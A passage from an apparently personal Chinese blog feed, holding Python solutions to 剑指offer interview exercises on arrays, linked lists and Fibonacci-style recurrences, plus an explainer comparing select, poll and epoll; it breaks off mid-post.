<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># array 二维列表</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Find</span><span class="params">(self, target, array)</span>:</span></div><div class="line">        i = <span class="number">0</span></div><div class="line">        j = len(array[<span class="number">0</span>])<span class="number">-1</span></div><div class="line">        <span class="keyword">while</span> i &lt; len(array) <span class="keyword">and</span> j &gt;= <span class="number">0</span>:</div><div class="line">            <span class="keyword">if</span> target &lt; array[i][j]:</div><div class="line">                j -= <span class="number">1</span></div><div class="line">            <span class="keyword">elif</span> target &gt; array[i][j]:</div><div class="line">                i += <span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div></pre></td></tr></table></figure>
<h4 id="旋转数组的最小数字"><a href="#旋转数组的最小数字" class="headerlink" title="旋转数组的最小数字"></a>旋转数组的最小数字</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。例如数组{3,4,5,1,2}为{1,2,3,4,5}的一个旋转，该数组的最小值为1。NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。</p>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　对数据排序后，取第一个元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minNumberInRotateArray</span><span class="params">(self, rotateArray)</span>:</span></div><div class="line">        <span class="keyword">if</span> len(rotateArray) == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        rotateArray.sort()</div><div class="line">        <span class="keyword">return</span> rotateArray[<span class="number">0</span>]</div></pre></td></tr></table></figure>
<h5 id="题解-2-1"><a href="#题解-2-1" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　遍历数组，找到最小的元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minNumberInRotateArray</span><span class="params">(self, rotateArray)</span>:</span></div><div class="line">        length = len(rotateArray)</div><div class="line">        <span class="keyword">if</span> length == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        result = rotateArray[<span class="number">0</span>]</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</div><div class="line">            <span class="keyword">if</span> rotateArray[i]&lt;result:</div><div class="line">                result = rotateArray[i]</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<h5 id="题解-3"><a href="#题解-3" class="headerlink" title="题解 3"></a>题解 3</h5><p>　　利用二分查找。旋转数组可以根据原数组第一个元素（即最小数字）分为两个不减的数组。利用该性质可以使用两个指针来实现二分，初始化时将第一个指针指向数组第1个元素，第二个指针指向数组最后一个元素，然后取两个指针中间的指针（取整）。如果数值大于第二个指针的数字，则最小的元素在后半部分，将第一个指针赋为中间指针后的一个元素；如果数值小于等于第二个指针的数字，则最小的元素在前半部分，将第二个指针赋为中间指针。直到第一个指针和第二个指针相遇，即为最小数字。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minNumberInRotateArray</span><span class="params">(self, rotateArray)</span>:</span></div><div class="line">        length = len(rotateArray)</div><div class="line">        <span class="keyword">if</span> length == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        low = <span class="number">0</span></div><div class="line">        high = length<span class="number">-1</span></div><div class="line">        <span class="keyword">while</span> low&lt;high:</div><div class="line">            mid = low + (high - low)//<span class="number">2</span></div><div class="line">            <span class="keyword">if</span> rotateArray[mid]&gt;rotateArray[high]:</div><div class="line">                low = mid+<span class="number">1</span></div><div class="line">            <span class="keyword">elif</span> rotateArray[mid]&lt;=rotateArray[high]:</div><div class="line">                high = mid</div><div class="line">        <span class="keyword">return</span> rotateArray[low]</div></pre></td></tr></table></figure>
<h4 id="数字在排序数组中出现的次数"><a href="#数字在排序数组中出现的次数" class="headerlink" title="数字在排序数组中出现的次数"></a>数字在排序数组中出现的次数</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　统计一个数字在排序数组中出现的次数。</p>
<h5 id="题解-1-1"><a href="#题解-1-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　利用 Python 列表的 count 方法来进行统计。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetNumberOfK</span><span class="params">(self, data, k)</span>:</span></div><div class="line">        <span class="keyword">return</span> data.count(k)</div></pre></td></tr></table></figure>
<h5 id="题解-2-2"><a href="#题解-2-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　借助二分查找，先找到 k 出现的位置，然后分别向前向后找到 k 第一次在数组中出现的位置和最后一次在数组中出现的位置，然后即可得到出现的次数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetNumberOfK</span><span class="params">(self, data, k)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        low = <span class="number">0</span></div><div class="line">        high = len(data) - <span class="number">1</span></div><div class="line">        cnt = <span class="number">0</span></div><div class="line">        end = high</div><div class="line">        <span class="keyword">while</span> low &lt;= high:</div><div class="line">            mid = (low + high) / <span class="number">2</span></div><div class="line">            <span class="keyword">if</span> data[mid] == k:</div><div class="line">                <span class="comment"># 向前查找</span></div><div class="line">                <span class="keyword">while</span> mid &gt;= <span class="number">0</span> <span class="keyword">and</span> data[mid] == k:</div><div class="line">                    mid -= <span class="number">1</span></div><div class="line">                mid += <span class="number">1</span></div><div class="line"></div><div class="line">                <span class="comment"># 向后查找</span></div><div class="line">                <span class="keyword">while</span> mid &lt;= end <span class="keyword">and</span> data[mid] == k:</div><div class="line">                    mid += <span class="number">1</span></div><div class="line">                    cnt += <span class="number">1</span></div><div class="line">                <span class="keyword">return</span> cnt</div><div class="line">            <span class="keyword">elif</span> data[mid] &lt; k:</div><div class="line">                low = mid + <span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                high = mid - <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> cnt</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-链表(上)</title>
    <url>/2019/07/22/%E5%89%91%E6%8C%87offer-%E9%93%BE%E8%A1%A8-%E4%B8%8A/</url>
    <content><![CDATA[<p><center>秋招，来了！</center><br><a id="more"></a></p>
<h4 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入一个链表，反转链表后，输出新链表的表头。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　由于题目并没有要求必须原地反转，因此可以借助外部空间实现。这里可以将单链表储存到列表，然后从后向前遍历列表，实现反转。但是，此方式比较浪费空间，而且需要两次遍历，效率较低。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回ListNode</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ReverseList</span><span class="params">(self, pHead)</span>:</span></div><div class="line">        </div><div class="line">        <span class="keyword">if</span> pHead == <span class="keyword">None</span> <span class="keyword">or</span> pHead.next==<span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> pHead</div><div class="line">    </div><div class="line">        res = []</div><div class="line">        <span class="keyword">while</span> pHead:</div><div class="line">            res.append(pHead)</div><div class="line">            pHead = pHead.next</div><div class="line">        </div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</div><div class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</div><div class="line">                res[i].next = <span class="keyword">None</span></div><div class="line">                <span class="keyword">return</span> res[<span class="number">-1</span>]</div><div class="line">            res[i].next = res[i<span class="number">-1</span>]</div></pre></td></tr></table></figure>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　使用 3 个指针，分别指向当前遍历到的结点、它的前一个结点及后一个结点。在遍历过程中，首先记录当前节点的后一个节点，然后将当前节点的后一个节点指向前一个节点，其次前一个节点再指向当前节点，最后再将当前节点指向最初记录的后一个节点，如此反复，直到当前节点的后一个节点为 None 时，则代表当前节点时反转后的头结点了。整个过程只需遍历链表一次，效率提高不少，且需要的外部空间也较题解1要少很多。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回ListNode</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ReverseList</span><span class="params">(self, pHead)</span>:</span></div><div class="line">        </div><div class="line">        <span class="keyword">if</span> pHead == <span class="keyword">None</span> <span class="keyword">or</span> pHead.next == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> pHead</div><div class="line"></div><div class="line">        last = <span class="keyword">None</span></div><div class="line">        <span class="keyword">while</span> pHead:</div><div class="line">            tmp = pHead.next</div><div class="line">            pHead.next = last</div><div class="line">            last = pHead</div><div class="line">            pHead = tmp</div><div class="line"></div><div class="line">        <span class="keyword">return</span> last</div></pre></td></tr></table></figure>
<h4 id="从尾到头打印链表"><a href="#从尾到头打印链表" class="headerlink" title="从尾到头打印链表"></a>从尾到头打印链表</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入一个链表，按链表从尾到头的顺序返回一个ArrayList。</p>
<h5 id="题解-1-1"><a href="#题解-1-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　借助列表，将链表节点的值存到列表中，再反转列表即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回从尾部到头部的列表值序列，例如[1,2,3]</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printListFromTailToHead</span><span class="params">(self, listNode)</span>:</span></div><div class="line">        result = []</div><div class="line">        <span class="keyword">while</span> listNode:</div><div class="line">            result.append(listNode.val)</div><div class="line">            listNode = listNode.next</div><div class="line">        result.reverse()</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<p>　　也可以借助栈：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回从尾部到头部的列表值序列，例如[1,2,3]</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printListFromTailToHead</span><span class="params">(self, listNode)</span>:</span></div><div class="line">        stack = []</div><div class="line">        <span class="keyword">while</span> listNode:</div><div class="line">            stack.append(listNode.val)</div><div class="line">            listNode = listNode.next</div><div class="line">        </div><div class="line">        result = []</div><div class="line">        <span class="keyword">while</span> stack:</div><div class="line">            result.append(stack.pop())</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<h5 id="题解-2-1"><a href="#题解-2-1" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　先反转链表，然后再遍历链表。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="comment"># 返回从尾部到头部的列表值序列，例如[1,2,3]</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printListFromTailToHead</span><span class="params">(self, listNode)</span>:</span></div><div class="line">        pHead = <span class="keyword">None</span></div><div class="line">        <span class="keyword">while</span> listNode:</div><div class="line">            tmp = listNode.next</div><div class="line">            listNode.next = pHead</div><div class="line">            pHead = listNode</div><div class="line">            listNode = tmp</div><div class="line"></div><div class="line">        result = []</div><div class="line">        <span class="keyword">while</span> pHead:</div><div class="line">            result.append(pHead.val)</div><div class="line">            pHead = pHead.next</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<h4 id="链表中倒数第k个结点"><a href="#链表中倒数第k个结点" class="headerlink" title="链表中倒数第k个结点"></a>链表中倒数第k个结点</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　输入一个链表，输出该链表中倒数第k个结点。</p>
<h5 id="题解-1-2"><a href="#题解-1-2" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　借助列表，遍历链表，将链表元素存入列表，再从列表中取出倒数第 k 个元素即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FindKthToTail</span><span class="params">(self, head, k)</span>:</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> head <span class="keyword">or</span> k == <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        result = []</div><div class="line">        <span class="keyword">while</span> head:</div><div class="line">            result.append(head)</div><div class="line">            head = head.next</div><div class="line">        <span class="keyword">if</span> k &gt; len(result):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">return</span> result[len(result)-k]</div></pre></td></tr></table></figure>
<h5 id="题解-2-2"><a href="#题解-2-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　快慢指针走法。快指针先走 k 步，然后快慢指针再同时往前走，当快指针走到尽头时，慢指针刚好在倒数第 k 个节点的位置上。这样只需要遍历一次链表即可。唯一需要注意的问题是小心参数 k 值大于链表长度。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># class ListNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.next = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">FindKthToTail</span><span class="params">(self, head, k)</span>:</span></div><div class="line">        fast = slow = head</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(k):</div><div class="line">            <span class="keyword">if</span> fast == <span class="keyword">None</span>:	<span class="comment"># 如果 k 大于链表长度，返回空</span></div><div class="line">                <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">            fast = fast.next</div><div class="line">        </div><div class="line">        <span class="keyword">while</span> fast:</div><div class="line">            fast = fast.next</div><div class="line">            slow = slow.next</div><div class="line">        <span class="keyword">return</span> slow</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Algorithm</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title>IO多路复用-select/poll/epoll</title>
    <url>/2019/07/18/IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8-select-poll-epoll/</url>
    <content><![CDATA[<center>IO 多路复用之 select/poll/epoll 学习</center>

<a id="more"></a>
<h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><h5 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h5><p>　　select() 的机制中提供一种 <code>fd_set</code> 的数据结构，实际上是一个 long 类型的数组，每一个数组元素都能与一打开的文件句柄（不管是Socket句柄,还是其他文件或命名管道或设备句柄）建立联系，建立联系的工作由程序员完成，当调用 select() 时，由内核根据 IO 状态修改 fd_set 的内容，由此来通知执行了 select() 的进程哪一个 Socket 或文件可读。</p>
<h5 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h5><p>　　select 目前几乎在所有的平台上支持，其良好跨平台支持也是它的一个优点。但是，select 仅仅知道有 I/O 事件发生了，却并不知道是哪那几个流（可能有一个，多个，甚至全部），因此只能无差别轮询所有流，找出能读出数据，或者写入数据的流，然后进行操作。select 主要有三个缺点：</p>
<ul>
<li>数据拷贝开销大。每次调用 select 都需要把 fd_set 集合从用户态拷贝到内核态，函数返回时，再次从内核拷贝结构体。fd_set 集合很大时，那么开销也很大。</li>
<li>查找匹配速度慢。每次调用select都需要在内核遍历传递进来的所有 fd_set，如果 fd_set 集合很大时，不仅查询速度慢，开销也很大。</li>
<li>连接数受限。为了减少数据拷贝带来的性能损坏，内核对被监控的 fd_set 集合大小做了限制，并且这个是通过宏控制的，大小不可改变（限制为1024）。</li>
</ul>
<h4 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h4><h5 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h5><p>　　poll 本质上和 select 没有区别，它将用户传入的数据拷贝到内核空间，然后查询每个 fd 对应的设备状态，如果设备就绪则在设备等待队列中加入一项并继续遍历，如果遍历完所有fd后没有发现就绪设备，则挂起当前进程，直到设备就绪或者主动超时，被唤醒后它又要再次遍历fd。 </p>
<h5 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h5><p>　　poll 没有最大连接数的限制，原因是它是基于链表来存储的。但是，select 存在的开销问题 poll 依然存在，对 poll 而言传递的结构体是 pollfd，结构体大小随fd个数增多而增加。因为每次调用时都会对连接进行线性遍历，所以随着 fd 的增加会造成遍历速度慢的“线性下降性能问题。</p>
<h4 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h4><h5 id="基本原理-2"><a href="#基本原理-2" class="headerlink" title="基本原理"></a>基本原理</h5><p>　　epoll 可以理解为 event poll，相对于 select 和 poll 来说，epoll 更加灵活，没有描述符限制。在 select/poll 中，进程只有在调用一定的方法后，内核才对所有监视的文件描述符进行扫描，而 epoll 事先通过 epoll_ctl() 来注册一个文件描述符，一旦基于某个文件描述符就绪时，内核会采用类似 callback 的回调机制，迅速激活这个文件描述符，当进程调用 epoll_wait() 时便得到通知。</p>
<p>　　epoll 对文件描述符的操作有两种模式：LT（level trigger）和 ET（edge trigger）：</p>
<ul>
<li>LT 模式：默认的工作模式，同时支持block和no-block socket。当 epoll_wait 检测到描述符事件发生并将此事件通知应用程序，应用程序可以不立即处理该事件。如果你不作任何操作，下次调用epoll_wait时，会再次响应应用程序并通知此事件。</li>
<li>ET 模式：高速工作方式，只支持 no-block socket。当 epoll_wait 检测到描述符事件发生并将此事件通知应用程序，应用程序必须立即处理该事件。如果不处理，下次调用epoll_wait时，不会再次响应应用程序并通知此事件。ET模式在很大程度上减少了epoll事件被重复触发的次数，因此效率要比LT模式高。</li>
</ul>
<h5 id="优缺点-2"><a href="#优缺点-2" class="headerlink" title="优缺点"></a>优缺点</h5><ul>
<li>epoll 没有最大并发连接的限制，能打开的 FD 的上限远大于1024（1G的内存上能监听约10万个端口）。</li>
<li>效率提升，基于事件的方式，无需轮询，不会随着FD数目的增加效率下降。只有活跃可用的FD才会调用callback函数；即 epoll最大的优点就在于它只管你“活跃”的连接，而跟连接总数无关，因此在实际的网络环境中，Epoll的效率就会远远高于select和poll。</li>
<li>内存拷贝，利用 mmap() 文件映射内存加速与内核空间的消息传递，即epoll使用mmap减少复制开销。使用一个文件描述符管理多个描述符，将用户关系的文件描述符的事件存放到内核的一个事件表中，这样在用户空间和内核空间的 copy 只需一次。</li>
<li>如果没有大量的idle-connection或者dead-connection，epoll的效率并不会比select/poll高很多，但是当遇到大量的idle-connection，就会发现epoll的效率大大高于select/poll。</li>
</ul>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>　　综上，在选择select，poll，epoll时要根据具体的使用场合以及这三种方式的自身特点。</p>
<ul>
<li>表面上看 epoll 的性能最好，但是在连接数少并且连接都十分活跃的情况下，select 和 poll 的性能可能比 epoll好，毕竟 epoll 的通知机制需要很多函数回调。</li>
<li>select 低效是因为每次它都需要轮询。但低效也是相对的，视情况而定，也可通过良好的设计改善。</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>IO多路复用</tag>
      </tags>
  </entry>
  <entry>
    <title>剑指offer-斐波那契数列</title>
    <url>/2019/07/10/%E5%89%91%E6%8C%87offer-%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97/</url>
    <content><![CDATA[<p><center>秋招，来了！</center><br><a id="more"></a></p>
<h4 id="斐波那契数列"><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　大家都知道斐波那契数列，现在要求输入一个整数n，请你输出斐波那契数列的第 n (n&lt;=39)项（从0开始，第0项为0）。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h5><p>　　斐波那契数列属于经典的递归问题，对于这题的求解，我们首先要知道斐波那契数列的状态转移式，即<code>f[n]=f[n-1]+f[n-2]</code>，且在 n=1 或 2 时，f[n]=1。在理解基础的状态转移式后，最容易想到的便是递归调用：</p>
<p>递归法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Fibonacci</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</div><div class="line">            <span class="keyword">return</span> n</div><div class="line">        <span class="keyword">return</span> self.Fibonacci(n<span class="number">-1</span>) + self.Fibonacci(n<span class="number">-2</span>)</div></pre></td></tr></table></figure>
<p>　　但很遗憾，这样算法的时间复杂度往往达不到要求。</p>
<h5 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h5><p>　　仔细观察后可以发现，每次求解的 f[n] 都在之后两个 f[n] 的求解中起作用，因此我们可以将其保存，这样能够避免重复计算，降低算法的时间复杂度；同时，因为只在后续两个 f[n] 的求解中起作用，因此只需要保存两个 f[n] 的值即可。从下向上计算：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Fibonacci</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</div><div class="line">            <span class="keyword">return</span> n</div><div class="line">        pre_two = <span class="number">0</span></div><div class="line">        pre_one = <span class="number">1</span></div><div class="line">        result = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, n+<span class="number">1</span>):</div><div class="line">            result = pre_one + pre_two</div><div class="line">            pre_two = pre_one</div><div class="line">            pre_one = result</div><div class="line">        <span class="keyword">return</span> result</div></pre></td></tr></table></figure>
<p>　　也可以简化写成这样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Fibonacci</span><span class="params">(self, n)</span>:</span></div><div class="line">        <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</div><div class="line">            <span class="keyword">return</span> n</div><div class="line">        res = <span class="number">1</span></div><div class="line">        pre = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, n+<span class="number">1</span>):</div><div class="line">            res = res + pre</div><div class="line">            pre = res - pre</div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<h4 id="跳台阶"><a href="#跳台阶" class="headerlink" title="跳台阶"></a>跳台阶</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法（先后次序不同算不同的结果）。</p>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">n  结果  可能的跳法</div><div class="line">1   1   (1)</div><div class="line">2   2   (11,2)</div><div class="line">3   3   (111,12,21)</div><div class="line">4   5   (1111,112,121,211,22)</div><div class="line">......</div><div class="line">F(n)=F(n-1)+F(n-2)</div><div class="line">显然，就是斐波那契数列。</div></pre></td></tr></table></figure>
<p>　　代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jumpFloor</span><span class="params">(self, number)</span>:</span></div><div class="line">        <span class="keyword">if</span> number &lt;= <span class="number">1</span>:</div><div class="line">            <span class="keyword">return</span> number</div><div class="line">        res = <span class="number">1</span></div><div class="line">        pre = <span class="number">1</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, number+<span class="number">1</span>):</div><div class="line">            res = res + pre</div><div class="line">            pre = res - pre</div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<h4 id="变态跳台阶"><a href="#变态跳台阶" class="headerlink" title="变态跳台阶"></a>变态跳台阶</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>　　一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">n   结果   跳法</div><div class="line">1    1    (1)</div><div class="line">2    2    (11,2)</div><div class="line">3    4    (111,12,21,3)</div><div class="line">4    8    (1111,112,121,211,22,13,31,4)</div><div class="line">.....</div><div class="line">f(3)=f(2)+f(1)+1</div><div class="line">推出：f(n)=f(n-1)+f(n-2)+ *** +f(1)+1</div><div class="line"></div><div class="line">而f(n-1)=f(n-2)+ *** +f(1)+1</div><div class="line">因此：</div><div class="line">f(n)-f(n-1)=f(n-1)</div><div class="line">即f(n)=2*f(n-1)</div></pre></td></tr></table></figure>
<p>　　代码：</p>
